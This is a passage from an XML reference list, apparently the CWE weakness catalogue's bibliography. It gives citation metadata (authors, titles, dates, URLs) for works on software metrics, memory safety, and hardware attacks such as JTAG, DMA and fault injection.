			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://en.wikipedia.org/wiki/Cyclomatic_complexity</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-965">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Halstead complexity measures</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://en.wikipedia.org/wiki/Halstead_complexity_measures</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-966">
			<ns0:Author>Pratyusa Manadhata</ns0:Author>
			<ns0:Title>An Attack Surface Metric</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:URL>http://reports-archive.adm.cs.cmu.edu/anon/2008/CMU-CS-08-152.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-967">
			<ns0:Author>Pratyusa Manadhata</ns0:Author>
			<ns0:Author>Jeannette M. Wing</ns0:Author>
			<ns0:Title>Measuring a System's Attack Surface</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:URL>http://www.cs.cmu.edu/afs/cs/usr/wing/www/publications/ManadhataWing04.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-969">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Encapsulation (computer programming)</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-974">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Connection pool</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Connection_pool</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-975">
			<ns0:Author>Bruce Dawson</ns0:Author>
			<ns0:Title>Comparing Floating Point Numbers, 2012 Edition</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://randomascii.wordpress.com/2012/02/25/comparing-floating-point-numbers-2012-edition/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-976">
			<ns0:Author>Standard C++ Foundation</ns0:Author>
			<ns0:Title>Memory Management</ns0:Title>
			<ns0:URL>https://isocpp.org/wiki/faq/freestore-mgmt#delete-this</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-977">
			<ns0:Author>QuantStart</ns0:Author>
			<ns0:Title>C++ Virtual Destructors: How to Avoid Memory Leaks</ns0:Title>
			<ns0:URL>https://www.quantstart.com/articles/C-Virtual-Destructors-How-to-Avoid-Memory-Leaks/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-978">
			<ns0:Author>GeeksforGeeks</ns0:Author>
			<ns0:Title>Virtual Destructor</ns0:Title>
			<ns0:URL>https://www.geeksforgeeks.org/virtual-destructor/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1008">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Computational complexity theory)</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Computational_complexity_theory</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1009">
			<ns0:Author>Tim Rains</ns0:Author>
			<ns0:Title>Microsoft's Free Security Tools - banned.h</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:URL>https://www.microsoft.com/en-us/security/blog/2012/08/30/microsofts-free-security-tools-banned-h/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1010">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>Microsoft's Free Security Tools - banned.h</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:URL>https://www.microsoft.com/en-us/security/blog/2012/08/30/microsofts-free-security-tools-banned-h/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1029">
			<ns0:Author>Aleph One</ns0:Author>
			<ns0:Title>Smashing The Stack For Fun And Profit</ns0:Title>
			<ns0:Publication_Year>1996</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>http://phrack.org/issues/49/14.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1030">
			<ns0:Author>Eldar Marcussen</ns0:Author>
			<ns0:Title>Security issues with using PHP's escapeshellarg</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://baesystemsai.blogspot.com/2013/11/security-issues-with-using-phps.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1031">
			<ns0:Title>Null pointer / Null dereferencing</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/Null_pointer#Null_dereferencing</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1032">
			<ns0:Title>Null Reference Creation and Null Pointer Dereference</ns0:Title>
			<ns0:Publisher>Apple</ns0:Publisher>
			<ns0:URL>https://developer.apple.com/documentation/xcode/null-reference-creation-and-null-pointer-dereference</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1033">
			<ns0:Title>NULL Pointer Dereference [CWE-476]</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:Publisher>ImmuniWeb</ns0:Publisher>
			<ns0:URL>https://www.immuniweb.com/vulnerability/null-pointer-dereference.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1034">
			<ns0:Author>Raoul Strackx</ns0:Author>
			<ns0:Author>Yves Younan</ns0:Author>
			<ns0:Author>Pieter Philippaerts</ns0:Author>
			<ns0:Author>Frank Piessens</ns0:Author>
			<ns0:Author>Sven Lachmund</ns0:Author>
			<ns0:Author>Thomas Walter</ns0:Author>
			<ns0:Title>Breaking the memory secrecy assumption</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---31</ns0:Publication_Day>
			<ns0:Publisher>ACM</ns0:Publisher>
			<ns0:URL>https://dl.acm.org/doi/10.1145/1519144.1519145</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1035">
			<ns0:Author>Fermin J. Serna</ns0:Author>
			<ns0:Title>The info leak era on software exploitation</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1036">
			<ns0:Author>Ali Abbasi and Majid Hashemi</ns0:Author>
			<ns0:Title>Ghost in the PLC Designing an Undetectable Programmable Logic Controller Rootkit via Pin Control Attack</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:URL>https://www.blackhat.com/docs/eu-16/materials/eu-16-Abbasi-Ghost-In-The-PLC-Designing-An-Undetectable-Programmable-Logic-Controller-Rootkit-wp.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1037">
			<ns0:Author>Kurt Rosenfeld</ns0:Author>
			<ns0:Author>Ramesh Karri</ns0:Author>
			<ns0:Title>Attacks and Defenses for JTAG</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=5406671</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1038">
			<ns0:Title>DMA attack</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://en.wikipedia.org/wiki/DMA_attack</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1039">
			<ns0:Author>A. Theodore Markettos</ns0:Author>
			<ns0:Author>Colin Rothwell</ns0:Author>
			<ns0:Author>Brett F. Gutstein</ns0:Author>
			<ns0:Author>Allison Pearce</ns0:Author>
			<ns0:Author>Peter G. Neumann</ns0:Author>
			<ns0:Author>Simon W. Moore</ns0:Author>
			<ns0:Author>Robert N. M. Watson</ns0:Author>
			<ns0:Title>Thunderclap: Exploring Vulnerabilities in Operating System IOMMU Protection via DMA from Untrustworthy Peripherals</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_05A-1_Markettos_paper.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1040">
			<ns0:Author>Maximillian Dornseif</ns0:Author>
			<ns0:Author>Michael Becher</ns0:Author>
			<ns0:Author>Christian N. Klein</ns0:Author>
			<ns0:Title>FireWire all your memory are belong to us</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:URL>http://www.orkspace.net/secdocs/Conferences/CanSecWest/2005/0wn3d%20by%20an%20iPod%20-%20Firewire1394%20Issues.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1041">
			<ns0:Author>Rory Breuk</ns0:Author>
			<ns0:Author>Albert Spruyt</ns0:Author>
			<ns0:Author>Adam Boileau</ns0:Author>
			<ns0:Title>Integrating DMA attacks in exploitation frameworks</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://www.os3.nl/_media/2011-2012/courses/rp1/p14_report.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1042">
			<ns0:Author>Maximillian Dornseif</ns0:Author>
			<ns0:Title>Owned by an iPod</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:URL>https://web.archive.org/web/20060505224959/https://pacsec.jp/psj04/psj04-dornseif-e.ppt</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1043">
			<ns0:Author>Gopal Vishwakarma</ns0:Author>
			<ns0:Author>Wonjun Lee</ns0:Author>
			<ns0:Title>Exploiting JTAG and Its Mitigation in IOT: A Survey</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://www.mdpi.com/1999-5903/10/12/121/pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1044">
			<ns0:Author>Dmytro Oleksiuk</ns0:Author>
			<ns0:Title>My aimful life</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:URL>http://blog.cr4.sh/2015/09/breaking-uefi-security-with-software.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1046">
			<ns0:Author>A. Theodore Markettos</ns0:Author>
			<ns0:Author>Adam Boileau</ns0:Author>
			<ns0:Title>Hit by a Bus:Physical Access Attacks with Firewire</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:URL>https://security-assessment.com/files/presentations/ab_firewire_rux2k6-final.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1047">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>General Data Protection Regulation</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/General_Data_Protection_Regulation</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1048">
			<ns0:Author>State of California Department of Justice, Office of the Attorney General</ns0:Author>
			<ns0:Title>California Consumer Privacy Act (CCPA)</ns0:Title>
			<ns0:URL>https://oag.ca.gov/privacy/ccpa</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1049">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Parasitic computing</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Parasitic_computing</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1050">
			<ns0:Author>WASC</ns0:Author>
			<ns0:Title>Insecure Indexing</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13246937/Insecure%20Indexing</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1051">
			<ns0:Title>Oracle Java Documentation</ns0:Title>
			<ns0:URL> https://docs.oracle.com/javase/1.5.0/docs/guide/language/autoboxing.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1052">
			<ns0:Author>The Software Engineering Institute</ns0:Author>
			<ns0:Title>SEI CERT Oracle Coding Standard for Java : Rule 02. Expressions (EXP)</ns0:Title>
			<ns0:URL>https://wiki.sei.cmu.edu/confluence/display/java/EXP04-J.+Do+not+pass+arguments+to+certain+Java+Collections+Framework+methods+that+are+a+different+type+than+the+collection+parameter+type</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1053">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>Digital Identity Guidelines (SP 800-63B)</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:URL>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1055">
			<ns0:Author>Peter Gutmann</ns0:Author>
			<ns0:Title>Data Remanence in Semiconductor Devices</ns0:Title>
			<ns0:Publication>10th USENIX Security Symposium</ns0:Publication>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>https://www.usenix.org/legacy/events/sec01/full_papers/gutmann/gutmann.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1056">
			<ns0:Author>F-Secure Labs</ns0:Author>
			<ns0:Title>Multiple Vulnerabilities in Barco Clickshare: JTAG access is not permanently disabled</ns0:Title>
			<ns0:URL>https://labs.f-secure.com/advisories/multiple-vulnerabilities-in-barco-clickshare/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1057">
			<ns0:Author>Kurt Rosenfeld</ns0:Author>
			<ns0:Author>Ramesh Karri</ns0:Author>
			<ns0:Title>Attacks and Defenses for JTAG</ns0:Title>
			<ns0:URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=5406671</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1058">
			<ns0:Author>Moinuddin Qureshi</ns0:Author>
			<ns0:Author>Michele Franchescini</ns0:Author>
			<ns0:Author>Vijayalakshmi Srinivasan</ns0:Author>
			<ns0:Author>Luis Lastras</ns0:Author>
			<ns0:Author>Bulent Abali</ns0:Author>
			<ns0:Author>John Karidis</ns0:Author>
			<ns0:Title>Enhancing Lifetime and Security of PCM-Based Main Memory with Start-Gap Wear Leveling</ns0:Title>
			<ns0:URL>https://researcher.watson.ibm.com/researcher/files/us-moinqureshi/papers-sgap.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1059">
			<ns0:Author>Micron</ns0:Author>
			<ns0:Title>Bad Block Management in NAND Flash Memory</ns0:Title>
			<ns0:URL>https://www.micron.com/-/media/client/global/documents/products/technical-note/nand-flash/tn2959_bbm_in_nand_flash.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1060">
			<ns0:Author>Farimah Farahmandi</ns0:Author>
			<ns0:Author>Prabhat Mishra</ns0:Author>
			<ns0:Title>FSM Anomaly Detection using Formal Analysis</ns0:Title>
			<ns0:URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=8119228&amp;tag=1</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1061">
			<ns0:Author>Keith Bowman</ns0:Author>
			<ns0:Author>James Tschanz</ns0:Author>
			<ns0:Author>Chris Wilkerson</ns0:Author>
			<ns0:Author>Shih-Lien Lu</ns0:Author>
			<ns0:Author>Tanay Karnik</ns0:Author>
			<ns0:Author>Vivek De</ns0:Author>
			<ns0:Author>Shekhar Borkar</ns0:Author>
			<ns0:Title>Circuit Techniques for Dynamic Variation Tolerance</ns0:Title>
			<ns0:URL>https://dl.acm.org/doi/10.1145/1629911.1629915</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1062">
			<ns0:Author>Dan Ernst</ns0:Author>
			<ns0:Author>Nam Sung Kim</ns0:Author>
			<ns0:Author>Shidhartha Das</ns0:Author>
			<ns0:Author>Sanjay Pant</ns0:Author>
			<ns0:Author>Rajeev Rao</ns0:Author>
			<ns0:Author>Toan Pham</ns0:Author>
			<ns0:Author>Conrad Ziesler</ns0:Author>
			<ns0:Author>David Blaauw</ns0:Author>
			<ns0:Author>Todd Austin</ns0:Author>
			<ns0:Author>Krisztian Flautner</ns0:Author>
			<ns0:Author>Trevor Mudge</ns0:Author>
			<ns0:Title>Razor: A Low-Power Pipeline Based on Circuit-Level Timing Speculation</ns0:Title>
			<ns0:URL>https://web.eecs.umich.edu/~taustin/papers/MICRO36-Razor.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1063">
			<ns0:Author>James Tschanz</ns0:Author>
			<ns0:Author>Keith Bowman</ns0:Author>
			<ns0:Author>Steve Walstra</ns0:Author>
			<ns0:Author>Marty Agostinelli</ns0:Author>
			<ns0:Author>Tanay Karnik</ns0:Author>
			<ns0:Author>Vivek De</ns0:Author>
			<ns0:Title>Tunable Replica Circuits and Adaptive Voltage-Frequency Techniques for Dynamic Voltage, Temperature, and Aging Variation Tolerance</ns0:Title>
			<ns0:URL>https://ieeexplore.ieee.org/document/5205410</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1064">
			<ns0:Author>Bilgiday Yuce</ns0:Author>
			<ns0:Author>Nahid F. Ghalaty</ns0:Author>
			<ns0:Author>Chinmay Deshpande</ns0:Author>
			<ns0:Author>Conor Patrick</ns0:Author>
			<ns0:Author>Leyla Nazhandali</ns0:Author>
			<ns0:Author>Patrick Schaumont</ns0:Author>
			<ns0:Title>FAME: Fault-attack Aware Microprocessor Extensions for Hardware Fault Detection and Software Fault Response</ns0:Title>
			<ns0:URL>https://dl.acm.org/doi/10.1145/2948618.2948626</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1065">
			<ns0:Author>Keith A. Bowman</ns0:Author>
			<ns0:Author>James W. Tschanz</ns0:Author>
			<ns0:Author>Shih-Lien L. Lu</ns0:Author>
			<ns0:Author>Paolo A. Aseron</ns0:Author>
			<ns0:Author>Muhammad M. Khellah</ns0:Author>
			<ns0:Author>Arijit Raychowdhury</ns0:Author>
			<ns0:Author>Bibiche M. Geuskens</ns0:Author>
			<ns0:Author>Carlos Tokunaga</ns0:Author>
			<ns0:Author>Chris B. Wilkerson</ns0:Author>
			<ns0:Author>Tanay Karnik</ns0:Author>
			<ns0:Author>Vivek De</ns0:Author>
			<ns0:Title>A 45 nm Resilient Microprocessor Core for Dynamic Variation Tolerance</ns0:Title>
			<ns0:URL>https://ieeexplore.ieee.org/document/5654663</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1066">
			<ns0:Author>Niek Timmers</ns0:Author>
			<ns0:Author>Albert Spruyt</ns0:Author>
			<ns0:Title>Bypassing Secure Boot Using Fault Injection</ns0:Title>
			<ns0:URL>https://www.blackhat.com/docs/eu-16/materials/eu-16-Timmers-Bypassing-Secure-Boot-Using-Fault-Injection.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1067">
			<ns0:Author>Brian Bailey</ns0:Author>
			<ns0:Title>Why Chips Die</ns0:Title>
			<ns0:URL>https://semiengineering.com/why-chips-die/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1068">
			<ns0:Author>V. Lakshminarayan</ns0:Author>
			<ns0:Title>What causes semiconductor devices to fail</ns0:Title>
			<ns0:URL>Original</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1069">
			<ns0:Author>Tanakorn Leesatapornwongsa</ns0:Author>
			<ns0:Author>Jeffrey F. Lukman</ns0:Author>
			<ns0:Author>Shan Lu</ns0:Author>
			<ns0:Author>Haryadi S. Gunawi</ns0:Author>
			<ns0:Title>TaxDC: A Taxonomy of Non-Deterministic Concurrency Bugs
				in Datacenter Distributed Systems</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:URL>https://ucare.cs.uchicago.edu/pdf/asplos16-TaxDC.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1070">
			<ns0:Author>Tony Martin</ns0:Author>
			<ns0:Title>Ghost in the Shell Weakness</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://friendsglobal.com/ghost-in-the-shell/ghost-in-the-shell-weakness/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1071">
			<ns0:Author>Ali Abbasi</ns0:Author>
			<ns0:Author>Tobias Scharnowski</ns0:Author>
			<ns0:Author>Thorsten Holz</ns0:Author>
			<ns0:Title>Doors of Durin: The Veiled Gate to Siemens S7 Silicon</ns0:Title>
			<ns0:URL>https://i.blackhat.com/eu-19/Wednesday/eu-19-Abbasi-Doors-Of-Durin-The-Veiled-Gate-To-Siemens-S7-Silicon.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1072">
			<ns0:Author>Sergei Skorobogatov</ns0:Author>
			<ns0:Author>Christopher Woods</ns0:Author>
			<ns0:Title>Breakthrough Silicon Scanning Discovers Backdoor in Military Chip</ns0:Title>
			<ns0:URL>https://www.cl.cam.ac.uk/~sps32/Silicon_scan_draft.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1073">
			<ns0:Author>Chris Domas</ns0:Author>
			<ns0:Title>God Mode Unlocked: Hardware Backdoors in x86 CPUs</ns0:Title>
			<ns0:URL>https://i.blackhat.com/us-18/Thu-August-9/us-18-Domas-God-Mode-Unlocked-Hardware-Backdoors-In-x86-CPUs.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1074">
			<ns0:Author>Jonathan Brossard</ns0:Author>
			<ns0:Title>Hardware Backdooring is Practical</ns0:Title>
			<ns0:URL>https://media.blackhat.com/bh-us-12/Briefings/Brossard/BH_US_12_Brossard_Backdoor_Hacking_Slides.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1075">
			<ns0:Author>Sergei Skorabogatov</ns0:Author>
			<ns0:Title>Security, Reliability, and Backdoors</ns0:Title>
			<ns0:URL>https://www.cl.cam.ac.uk/~sps32/SG_talk_SRB.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1076">
			<ns0:Author>ARM</ns0:Author>
			<ns0:Title>Cortex-R4 Manual</ns0:Title>
			<ns0:URL>https://developer.arm.com/Processors/Cortex-M4</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1077">
			<ns0:Author>Intel</ns0:Author>
			<ns0:Title>MCS 51 Microcontroller Family User's Manual</ns0:Title>
			<ns0:URL>http://web.mit.edu/6.115/www/document/8051.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1078">
			<ns0:Author>ARM</ns0:Author>
			<ns0:Title>Memory Protection Unit (MPU)</ns0:Title>
			<ns0:URL>https://web.archive.org/web/20200630034848/https://static.docs.arm.com/100699/0100/armv8m_architecture_memory_protection_unit_100699_0100_00_en.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1079">
			<ns0:Author>Joe Fitzpatrick</ns0:Author>
			<ns0:Title>SCA4n00bz - Timing-based Sidechannel Attacks for Hardware N00bz workshop</ns0:Title>
			<ns0:URL>https://github.com/securelyfitz/SCA4n00bz</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1080">
			<ns0:Author>Christopher Tarnovsky</ns0:Author>
			<ns0:Title>Security Failures in Secure Devices</ns0:Title>
			<ns0:URL>https://www.blackhat.com/presentations/bh-europe-08/Tarnovsky/Presentation/bh-eu-08-tarnovsky.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1081">
			<ns0:Author>Kit Murdock</ns0:Author>
			<ns0:Author>David Oswald</ns0:Author>
			<ns0:Author>Flavio D Garcia</ns0:Author>
			<ns0:Author>Jo Van Bulck</ns0:Author>
			<ns0:Author>Frank Piessens</ns0:Author>
			<ns0:Author>Daniel Gruss</ns0:Author>
			<ns0:Title>Plundervolt</ns0:Title>
			<ns0:URL>https://plundervolt.com/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1082">
			<ns0:Author>Adrian Tang</ns0:Author>
			<ns0:Author>Simha Sethumadhavan</ns0:Author>
			<ns0:Author>Salvatore Stolfo</ns0:Author>
			<ns0:Title>CLKSCREW: Exposing the Perils of Security-Oblivious Energy Management</ns0:Title>
			<ns0:URL>https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-tang.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1083">
			<ns0:Author>Yoongu Kim</ns0:Author>
			<ns0:Author>Ross Daly</ns0:Author>
			<ns0:Author>Jeremie Kim</ns0:Author>
			<ns0:Author>Ji Hye Lee</ns0:Author>
			<ns0:Author>Donghyuk Lee</ns0:Author>
			<ns0:Author>Chris Wilkerson</ns0:Author>
			<ns0:Author>Konrad Lai</ns0:Author>
			<ns0:Author>Onur Mutlu</ns0:Author>
			<ns0:Title>Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors</ns0:Title>
			<ns0:URL>https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1084">
			<ns0:Author>Gopal Vishwakarma</ns0:Author>
			<ns0:Author>Wonjun Lee</ns0:Author>
			<ns0:Title>JTAG Explained (finally!): Why "IoT", Software Security Engineers, and Manufacturers Should Care</ns0:Title>
			<ns0:URL>https://www.mdpi.com/1999-5903/10/12/121/pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1085">
			<ns0:Author>Bob Molyneaux</ns0:Author>
			<ns0:Author>Mark McDermott</ns0:Author>
